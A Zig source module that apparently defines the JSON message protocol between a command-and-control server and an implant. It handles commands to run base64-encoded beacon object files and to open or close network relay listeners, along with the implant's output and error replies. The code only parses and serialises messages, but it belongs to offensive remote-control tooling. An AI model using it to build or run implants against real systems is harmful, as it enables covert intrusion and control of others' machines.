//! Wire protocol — server <-> implant newline-JSON messages.
//!
//! Mirrors `crates/protocol/src/lib.rs`. Discriminator is `type`, snake_case:
//!   server -> implant: hello | bof | relay_listen | relay_stop
//!   implant -> server: hello | output | error | relay_started | relay_stopped | relay_error
//!
//! Parsing uses std.json's Value tree then dispatches on `type`. Serialization
//! is hand-built (the schema is tiny and fixed); `data` fields carry arbitrary
//! BOF output, so they go through a JSON string escaper.

const std = @import("std");

pub const ServerMessage = union(enum) {
    hello,
    bof: struct { file: []const u8, args: []const u8 }, // base64 strings (borrowed from the JSON arena)
    relay_listen: struct { relay_id: []const u8, bind_ip: []const u8, port: u16 },
    relay_stop: struct { relay_id: []const u8 },
};

pub const ImplantMessage = union(enum) {
    hello: []const u8,
    output: []const u8,
    @"error": []const u8,
    relay_started: struct { relay_id: []const u8, bind_ip: []const u8, port: u16 },
    relay_stopped: []const u8,
    relay_error: struct { relay_id: []const u8, data: []const u8 },
};

// ---- base64 ----

pub fn decodeBase64(alloc: std.mem.Allocator, b64: []const u8) ![]u8 {
    const dec = std.base64.standard.Decoder;
    const len = dec.calcSizeForSlice(b64) catch return error.BadBase64;
    const buf = try alloc.alloc(u8, len);
    dec.decode(buf, b64) catch {
        alloc.free(buf);
        return error.BadBase64;
    };
    return buf;
}

pub fn encodeBase64(alloc: std.mem.Allocator, raw: []const u8) ![]u8 {
    const enc = std.base64.standard.Encoder;
    const buf = try alloc.alloc(u8, enc.calcSize(raw.len));
    _ = enc.encode(buf, raw);
    return buf;
}

// ---- parsing ----

/// Parsed server message + the arena that owns its borrowed slices. Call
/// `deinit()` to free.
pub const ParsedServer = struct {
    arena: *std.heap.ArenaAllocator,
    msg: ServerMessage,

    pub fn deinit(self: *ParsedServer) void {
        self.arena.deinit();
        const gpa = self.arena.child_allocator;
        gpa.destroy(self.arena);
    }
};

/// Parse one server message line. Returns a ParsedServer whose borrowed slices
/// are valid until deinit.
pub fn parseServer(alloc: std.mem.Allocator, line: []const u8) !ParsedServer {
    const arena_ptr = try alloc.create(std.heap.ArenaAllocator);
    arena_ptr.* = std.heap.ArenaAllocator.init(alloc);
    errdefer {
        arena_ptr.deinit();
        alloc.destroy(arena_ptr);
    }
    const a = arena_ptr.allocator();

    const parsed = try std.json.parseFromSliceLeaky(std.json.Value, a, line, .{});
    const obj = parsed.object;
    const t = obj.get("type") orelse return error.MissingType;
    const ts = t.string;

    if (std.mem.eql(u8, ts, "hello")) {
        return .{ .arena = arena_ptr, .msg = .hello };
    } else if (std.mem.eql(u8, ts, "bof")) {
        const file = obj.get("file").?.string;
        const args_v: std.json.Value = obj.get("args") orelse .{ .null = {} };
        const args = if (args_v == .string) args_v.string else "";
        return .{ .arena = arena_ptr, .msg = .{ .bof = .{ .file = file, .args = args } } };
    } else if (std.mem.eql(u8, ts, "relay_listen")) {
        const relay_id = obj.get("relay_id").?.string;
        const bind_ip = obj.get("bind_ip").?.string;
        const port_v = obj.get("port") orelse std.json.Value{ .integer = 0 };
        const port: u16 = switch (port_v) {
            .integer => |i| @intCast(@max(0, i)),
            else => 0,
        };
        return .{ .arena = arena_ptr, .msg = .{ .relay_listen = .{ .relay_id = relay_id, .bind_ip = bind_ip, .port = port } } };
    } else if (std.mem.eql(u8, ts, "relay_stop")) {
        const relay_id = obj.get("relay_id").?.string;
        return .{ .arena = arena_ptr, .msg = .{ .relay_stop = .{ .relay_id = relay_id } } };
    }
    return error.UnknownType;
}

// ---- serialization ----

/// Append a JSON-escaped string (with surrounding quotes) to `out`.
fn appendJsonString(alloc: std.mem.Allocator, out: *std.ArrayList(u8), s: []const u8) !void {
    try out.append(alloc, '"');
    for (s) |c| {
        switch (c) {
            '"' => try out.appendSlice(alloc, "\\\""),
            '\\' => try out.appendSlice(alloc, "\\\\"),
            '\n' => try out.appendSlice(alloc, "\\n"),
            '\r' => try out.appendSlice(alloc, "\\r"),
            '\t' => try out.appendSlice(alloc, "\\t"),
            0...8, 11, 12, 14...31 => {
                var tmp: [6]u8 = undefined;
                _ = std.fmt.bufPrint(&tmp, "\\u{x:0>4}", .{c}) catch unreachable;
                try out.appendSlice(alloc, &tmp);
            },
            else => try out.append(alloc, c),
        }
    }
    try out.append(alloc, '"');
}

/// Serialize an implant message to a JSON string (no trailing newline).
pub fn encodeImplant(alloc: std.mem.Allocator, msg: ImplantMessage) ![]u8 {
    var out: std.ArrayList(u8) = .empty;
    defer out.deinit(alloc);
    try out.appendSlice(alloc, "{\"type\":\"");
    switch (msg) {
        .hello => |d| {
            try out.appendSlice(alloc, "hello\",\"data\":");
            try appendJsonString(alloc, &out, d);
        },
        .output => |d| {
            try out.appendSlice(alloc, "output\",\"data\":");
            try appendJsonString(alloc, &out, d);
        },
        .@"error" => |d| {
            try out.appendSlice(alloc, "error\",\"data\":");
            try appendJsonString(alloc, &out, d);
        },
        .relay_started => |r| {
            try out.appendSlice(alloc, "relay_started\",\"relay_id\":");
            try appendJsonString(alloc, &out, r.relay_id);
            try out.appendSlice(alloc, ",\"bind_ip\":");
            try appendJsonString(alloc, &out, r.bind_ip);
            try out.appendSlice(alloc, ",\"port\":");
            var pbuf: [16]u8 = undefined;
            const ps = std.fmt.bufPrint(&pbuf, "{d}", .{r.port}) catch unreachable;
            try out.appendSlice(alloc, ps);
        },
        .relay_stopped => |r| {
            try out.appendSlice(alloc, "relay_stopped\",\"relay_id\":");
            try appendJsonString(alloc, &out, r);
        },
        .relay_error => |r| {
            try out.appendSlice(alloc, "relay_error\",\"relay_id\":");
            try appendJsonString(alloc, &out, r.relay_id);
            try out.appendSlice(alloc, ",\"data\":");
            try appendJsonString(alloc, &out, r.data);
        },
    }
    try out.append(alloc, '}');
    return out.toOwnedSlice(alloc);
}
